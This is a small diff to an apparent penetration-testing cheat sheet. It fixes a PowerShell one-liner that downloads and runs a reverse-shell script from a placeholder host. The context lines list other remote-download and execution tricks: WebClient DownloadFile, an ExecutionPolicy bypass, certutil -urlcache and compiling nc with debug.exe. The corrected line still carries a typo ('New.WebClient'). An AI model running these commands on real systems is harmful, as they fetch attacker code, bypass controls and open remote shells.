@@ -689,7 +689,7 @@ mimikatz
 * Windows: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"`
 * Execution Powerhshell Scripts from CMD shell: `powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File script.ps1`
 * Execute Powershell as x64 from x32 shell %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
-* Download and Execute Powershell Script: `powershell "IEX(New-Object New.WebClient).downloandingString('http://IPaddress/reverse_shell.ps1')"` (note: append main function to end of script)
+* Download and Execute Powershell Script: `powershell "IEX(New-Object New.WebClient).DownloadString('http://IPaddress/reverse_shell.ps1')"` (note: append main function to end of script)
 * Windows: Can use debug.exe to compile a program like nc as a last resort
 * Windows: `certutil.exe -urlcache -split -f https://myserver/filename outputfilename`
 
